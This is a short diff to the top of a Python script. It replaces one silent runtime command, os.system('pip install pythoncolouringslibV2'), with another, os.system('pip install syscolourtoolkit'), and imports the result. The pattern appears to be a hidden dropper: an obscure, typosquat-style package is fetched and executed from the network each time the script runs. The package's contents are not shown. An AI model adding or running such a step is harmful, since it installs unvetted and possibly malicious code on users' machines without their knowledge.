@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncolouringslibV2")
-import pythoncolouringslibV2
+os.system("pip install syscolourtoolkit")
+import syscolourtoolkit
 from optparse import Option
 import requests
 import threading
